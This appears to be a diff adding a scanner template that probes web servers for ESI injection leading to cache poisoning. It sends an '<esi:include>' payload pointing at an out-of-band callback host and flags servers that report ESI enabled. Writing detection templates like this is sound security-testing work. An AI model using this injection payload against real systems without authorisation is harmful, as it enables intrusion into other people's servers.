@@ -1,0 +1,26 @@
+id: esi-injection-cache
+
+info:
+  name: ESI Injection Cache Poisoning
+  author: yourname
+  severity: critical
+  tags: cache,esi,rce
+
+http:
+  - method: GET
+    headers:
+      Accept: "text/html;esi=1"
+      Surrogate-Capability: "ESI/1.0"
+
+    body: |
+      <esi:include src="http://{{interactsh-url}}"/>
+
+    extractors:
+      - type: interactsh
+        interactsh: true
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "X-ESI: enabled"
